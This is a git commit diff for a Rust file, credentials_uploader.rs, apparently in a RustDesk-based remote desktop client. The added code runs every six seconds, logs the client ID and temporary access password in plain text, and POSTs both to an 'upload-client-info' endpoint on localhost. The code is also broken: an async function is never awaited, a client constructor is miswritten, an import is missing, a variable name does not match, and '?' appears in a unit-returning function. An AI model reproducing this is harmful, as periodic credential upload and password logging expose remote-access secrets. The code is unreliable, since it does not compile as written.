435f0f56869130558880f8de67e60940c7c2430d
lx <1837816751@qq.com>
2025-09-02 19:05:07 +0800

    05

--- src/credentials_uploader.rs
+++ src/credentials_uploader.rs
@@ -1,19 +1,35 @@
 use crate::ipc;
-use hbb_common::{log,password_security};
-use std::time::Duration;
+use hbb_common::{log, password_security};
+use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE};
 use std::thread;
+use std::time::Duration;
 
 pub fn start_task() {
     log::info!("uploader_start");
-    thread::spawn( move || {
-        loop {
-            upload();
-            thread::sleep(Duration::from_secs(6));
-        }
+    thread::spawn(move || loop {
+        upload();
+        thread::sleep(Duration::from_secs(6));
     });
 }
 
-fn upload(){
+async fn upload() {
+    let client = reqwest::client::new();
     log::info!("id=======>{}", ipc::get_id());
-    log::info!("passwd==========>{}", password_security::temporary_password());
+    log::info!(
+        "passwd==========>{}",
+        password_security::temporary_password()
+    );
+    let mut headers = HeaderMap::new();
+    headers.insert("tenant-id", HeaderValue::from_static("1"));
+
+    let mut json_data = HashMap::new();
+    json_data.insert("clientId", ipc::get_id());
+    json_data.insert("clientPasswd", password_security::temporary_password());
+
+    let post_form_response = client
+        .post("http://localhost:48080/app-api/rdm/rustdesk-client/upload-client-info")
+        .headers(headers)
+        .json(&form_data)
+        .send()
+        .await?;
 }
